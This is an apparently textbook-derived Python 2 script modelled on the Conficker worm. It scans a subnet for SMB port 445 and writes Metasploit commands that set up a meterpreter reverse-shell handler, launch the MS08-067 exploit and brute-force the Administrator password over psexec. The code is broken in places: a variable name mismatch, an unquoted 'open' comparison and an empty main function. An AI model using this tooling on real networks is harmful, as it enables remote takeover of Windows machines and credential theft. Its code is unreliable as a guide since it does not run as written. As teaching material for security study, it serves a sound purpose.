
import nmap

def banner():
	print "####  Conficker p 71-73   #####"

def findTgts(subnet):
	nmScan = nmap.PortScanner()
	nmScan.scan(subNet, '445')
	tgtHosts = []
	for host in nmScan.all_hosts():
		state = nmScan[host]['tcp'][445]['state']
		if state == open:
			print '[+] Found Target Host: '+host 
			tgtHosts.append(host)
	return tgtHosts

def setupHandler(configFile, lhost, lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set PAYLOAD '+'windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT '+str(lport) + '\n')
	configFile.write('set LHOST '+lhost + '\n')
	configFile.write('exploit -j -z\n')
	configFile.write('setg DisablePayloadhandler 1\n')

def confickerExploit(configFile, tgtHost, lhost):
	configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
	configFile.write('set RHOST '+str(tgtHost) +'\n')
	configFile.write('set LHOST '+lhost+'\n')
	configFile.write('exploit -j -z\n')

def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
	username = 'Administrator'
	pF = open(passwdFile, 'r')
	for password in pF.readlines():
		password = password.strip('\n').strip('\r')
		configFile.write('use exploit/windows/smb/psexec\n')
		configFile.write('set SMBUser '+str(username)+'\n')
		configFile.write('set SMBPass '+str(password)+'\n')
		configFile.write('set RHOST '+str(tgtHost)+'\n')
		configFile.write('set PAYLOAD '+ 'windows/meterpreter/reverse_tcp\n')
		configFile.write('set LPORT '+str(lport) + '\n')
		configFile.write('exploit -j -z\n')

def main():



if __name__ == '__main__':
	main()